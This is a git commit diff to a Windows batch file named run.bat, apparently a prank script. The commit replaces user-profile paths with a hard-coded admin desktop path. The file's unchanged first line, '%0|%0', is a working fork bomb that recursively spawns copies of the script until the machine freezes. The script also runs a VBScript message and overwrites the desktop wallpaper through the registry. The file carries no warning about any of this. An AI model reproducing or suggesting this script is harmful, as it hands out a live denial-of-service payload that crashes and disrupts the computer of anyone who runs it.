1314b1d2ac39ce06f708071729082ead8995fe42
ilovecodeing123456799 <90834028+ilovecodeing123456799@users.noreply.github.com>
2022-11-19 16:09:30 +0800

    Update run.bat

--- run.bat
+++ run.bat
@@ -1,7 +1,7 @@
 %0|%0
 @echo off
-start %userprofile%\desktop\message.vbs
-reg add "HKEY_CURRENT_USER\control panel\desktop" /v wallpaper /t REG_SZ /d  %userprofile%\desktop\t.jpg /f
+start C:\Users\admin\Desktop\message.vbs
+reg add "HKEY_CURRENT_USER\control panel\desktop" /v wallpaper /t REG_SZ /d  C:\Users\admin\Desktop\t.jpg
 RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters
 pause
 exit
